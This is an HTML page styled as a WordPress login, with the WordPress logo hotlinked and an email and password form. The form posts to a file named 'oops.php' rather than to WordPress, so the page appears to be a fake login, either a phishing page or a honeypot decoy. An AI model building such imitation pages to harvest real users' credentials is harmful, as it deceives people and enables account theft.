<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WP Login</title>
    <style>

input[type=text], select {
  width: 100%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  border-radius: 4px;
  box-sizing: border-box;
}
input[type=password], select {
  width: 100%;
  padding: 12px 20px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #ccc;
  border-radius: 4px;
  box-sizing: border-box;
}

input[type=submit] {
  width: 100%;
  background-color: #26e;
  color: white;
  padding: 14px 20px;
  margin: 8px 0;
  border: none;
  border-radius: 4px;
  cursor: pointer;
}

input[type=submit]:hover {
  background-color: #04c;
}

.div {
  border-radius: 5px;
  background-color: #f2f2f2;
  padding: 20px;
  width: 20%;
  min-width: 250px;
  margin-top: 10%;
  margin-left: auto;
  margin-right: auto;
  font-family: Verdana, Geneva, Tahoma, sans-serif;
}
.logo {
    width: 250px;

}

    </style>
</head>
<body>
  <center>

</center>
   <div class="div">
       <center>
       
       <img src="https://s.w.org/style/images/about/WordPress-logotype-wmark.png" alt="" class="logo">
        </center>
        <form class="loginfield" action="oops.php" method="POST">
    
    <input type="text" id="email" name="email" placeholder="E-Mail">

    
    <input type="password" id="passw" name="passw" placeholder="Passwort">

 
    <input type="submit" value="Login">
  </form>
</div>

</body>
</html>